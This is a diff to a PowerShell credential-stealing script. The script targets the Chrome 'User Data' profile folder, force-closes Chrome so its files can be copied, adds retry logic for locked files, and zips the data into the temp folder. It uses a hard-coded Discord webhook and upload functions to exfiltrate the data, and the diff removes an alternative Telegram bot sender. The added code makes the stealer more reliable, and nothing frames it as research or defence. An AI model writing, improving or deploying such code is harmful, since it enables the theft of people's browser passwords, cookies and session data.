@@ -9,23 +9,14 @@ $webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ
 # Debug log file
 $logFile = "$env:TEMP\debug_log.txt"
 
-# Function for sending messages through Telegram Bot
-function Send-TelegramMessage {
-    param ([string]$message)
-
-    if ($botToken -and $chatID) {
-        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
-        $body = @{ chat_id = $chatID; text = $message }
-
-        try {
-            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-            Add-Content -Path $logFile -Value "Message sent to Telegram: $message"
-        } catch {
-            Add-Content -Path $logFile -Value "Failed to send message to Telegram: $_"
-        }
-    } else {
-        Send-DiscordMessage -message $message
-    }
+# Force close Chrome to ensure files aren't in use
+$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
+if ($chromeProcesses) {
+    # Attempt to gracefully stop Chrome processes
+    Stop-Process -Name "chrome" -Force
+    Add-Content -Path $logFile -Value "Force closed Chrome to ensure files aren't in use."
+} else {
+    Add-Content -Path $logFile -Value "No Chrome processes found to close."
 }
 
 # Function for sending messages through Discord Webhook
@@ -98,6 +89,36 @@ function Upload-FileAndGetLink {
 $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
 $outputZip = "$env:TEMP\chrome_data.zip"
 
+# Function to copy files with retry logic for locked files
+function Copy-WithRetry {
+    param (
+        [string]$source,
+        [string]$destination,
+        [int]$maxRetries = 3,
+        [int]$retryDelay = 3
+    )
+
+    $retryCount = 0
+    $success = $false
+
+    while ($retryCount -lt $maxRetries -and !$success) {
+        try {
+            Copy-Item -Path $source -Destination $destination -ErrorAction Stop
+            $success = $true
+        } catch [System.IO.IOException] {
+            $retryCount++
+            Add-Content -Path $logFile -Value "File is locked, retrying ($retryCount/$maxRetries): $source"
+            Start-Sleep -Seconds $retryDelay
+        } catch {
+            Add-Content -Path $logFile -Value "Error copying file: $($_) - $source"
+            return $false
+        }
+    }
+
+    return $success
+}
+
+# Updated file copy loop using retry logic
 try {
     if (Test-Path $outputZip) {
         Remove-Item $outputZip -Force
@@ -115,9 +136,10 @@ try {
         if (-not (Test-Path $destination)) {
             New-Item -ItemType Directory -Path (Split-Path -Parent $destination) -Force | Out-Null
         }
-        try {
-            Copy-Item -Path $_.FullName -Destination $destination -ErrorAction Stop
-        } catch {
+
+        if (Copy-WithRetry -source $_.FullName -destination $destination) {
+            Add-Content -Path $logFile -Value "File copied successfully: $($_.FullName)"
+        } else {
             Add-Content -Path $logFile -Value "Skipped file (in use): $($_.FullName)"
         }
     }
@@ -130,3 +152,4 @@ try {
     Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
     exit
 }
+
